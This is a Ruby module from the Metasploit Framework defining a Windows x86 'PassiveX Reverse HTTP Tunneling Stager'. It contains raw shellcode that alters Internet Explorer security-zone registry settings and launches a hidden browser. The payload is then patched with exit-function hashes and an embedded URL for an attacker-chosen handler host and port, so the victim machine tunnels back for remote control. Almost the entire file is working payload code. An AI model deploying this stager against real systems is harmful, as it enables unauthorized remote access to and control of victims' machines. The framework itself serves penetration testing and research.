##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'
require 'msf/core/handler/passivex'


module Metasploit3

	include Msf::Payload::Stager
	include Msf::Payload::Windows

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'PassiveX Reverse HTTP Tunneling Stager',
			'Version'       => '$Revision$',
			'Description'   => 'Tunnel communication over HTTP using IE 6',
			'Author'        => 'skape',
			'License'       => MSF_LICENSE,
			'Platform'      => 'win',
			'Arch'          => ARCH_X86,
			'Handler'       => Msf::Handler::PassiveX,
			'Convention'    => 'sockedi passivex',
			'Stager'        =>
				{
					'Offsets' =>
						{
							'EXITFUNC' => [ 244, 'V' ],
						},
					'Payload' =>
						"\xfc\xe8\x77\x00\x00\x00\x53\x6f\x66\x74\x77\x61\x72\x65\x5c\x4d" +
						"\x69\x63\x72\x6f\x73\x6f\x66\x74\x5c\x57\x69\x6e\x64\x6f\x77\x73" +
						"\x5c\x43\x75\x72\x72\x65\x6e\x74\x56\x65\x72\x73\x69\x6f\x6e\x5c" +
						"\x49\x6e\x74\x65\x72\x6e\x65\x74\x20\x53\x65\x74\x74\x69\x6e\x67" +
						"\x73\x5c\x5a\x6f\x6e\x65\x73\x5c\x33\x00\x31\x30\x30\x34\x31\x32" +
						"\x30\x30\x31\x32\x30\x31\x31\x30\x30\x31\x43\x3a\x5c\x70\x72\x6f" +
						"\x67\x72\x61\x7e\x31\x5c\x69\x6e\x74\x65\x72\x6e\x7e\x31\x5c\x69" +
						"\x65\x78\x70\x6c\x6f\x72\x65\x20\x2d\x6e\x65\x77\x00\xe8\x4e\x00" +
						"\x00\x00\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x7c\x05\x78\x01\xef" +
						"\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\xe3\x32\x49\x8b\x34\x8b\x01\xee" +
						"\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b" +
						"\x54\x24\x28\x75\xe3\x8b\x5f\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5f" +
						"\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc2\x08\x00" +
						"\x5f\x5b\x31\xd2\x64\x8b\x42\x30\x85\xc0\x78\x0c\x8b\x40\x0c\x8b" +
						"\x70\x1c\xad\x8b\x40\x08\xeb\x09\x8b\x40\x34\x83\xc0\x7c\x8b\x40" +
						"\x3c\x89\xe5\x68\x7e\xd8\xe2\x73\x50\x68\x72\xfe\xb3\x16\x50\x68" +
						"\x8e\x4e\x0e\xec\x50\xff\xd7\x96\xff\xd7\x89\x45\x00\xff\xd7\x89" +
						"\x45\x04\x52\x68\x70\x69\x33\x32\x68\x61\x64\x76\x61\x54\xff\xd6" +
						"\x68\xa9\x2b\x92\x02\x50\x68\xdd\x9a\x1c\x2d\x50\xff\xd7\x89\x45" +
						"\x08\xff\xd7\x97\x87\xf3\x54\x56\x68\x01\x00\x00\x80\xff\xd7\x5b" +
						"\x83\xc6\x44\x50\x89\xe7\x80\x3e\x43\x74\x1b\x50\xad\x50\x89\xe0" +
						"\x6a\x04\x57\x6a\x04\x6a\x00\x50\x53\xff\x55\x08\xeb\xe8\x8a\x0d" +
						"\x30\x00\xfe\x7f\x88\x0e\x6a\x54\x59\x29\xcc\x89\xe7\x57\xf3\xaa" +
						"\x5f\xc6\x07\x44\xfe\x47\x2c\xfe\x47\x2d\x68\x75\x6c\x74\x00\x68" +
						"\x44\x65\x66\x61\x68\x74\x61\x30\x5c\x68\x57\x69\x6e\x53\x89\x67" +
						"\x08\x8d\x5f\x44\x53\x57\x50\x50\x6a\x10\x50\x50\x50\x56\x50\xff" +
						"\x55\x00\xff\x55\x04"
				}
			))
	end

	#
	# Do not transmit the stage over the connection.  We send the stage via an
	# HTTP request.
	#
	def stage_over_connection?
		false
	end

	def generate
		# Generate the payload
		p = super

		# we must manually patch in the exit funk for this stager as it uses the old hash values
		# which are generated using a different algorithm to that of the new hash values. We do this
		# as this stager code has not been rewritten using the new api calling technique (see block_api.asm).

		# set a default exitfunk if one is not set
		datastore['EXITFUNC'] = 'thread' if not datastore['EXITFUNC']
		# retrieve the offset/pack type for this stager's exitfunk
		offset, pack = offsets['EXITFUNC']
		# patch in the appropriate exit funk (using the old exit funk hashes).
		p[offset, 4] = [ 0x5F048AF0 ].pack(pack || 'V') if datastore['EXITFUNC'] == 'seh'
		p[offset, 4] = [ 0x60E0CEEF ].pack(pack || 'V') if datastore['EXITFUNC'] == 'thread'
		p[offset, 4] = [ 0x73E2D87E ].pack(pack || 'V') if datastore['EXITFUNC'] == 'process'

		# Construct the full URL that will be embedded in the payload.  The uri
		# attribute is derived from the value that will have been set by the
		# passivex handler.
		url = " http://#{datastore['PXHOST']}:#{datastore['PXPORT']}#{datastore['PXURI'] || '/'}"

		# Get the find function offset
		off = p[2, 4].unpack('V')[0]

		# Update the offset to include the length of the URL
		p[2, 4] = [ off + url.length ].pack('V')

		# Adjust the true offset by five
		off += 5

		# Insert the URL into the payload
		p = p[0, off] + url + p[off .. -1]

		# Return the updated payload
		return p
	end

end

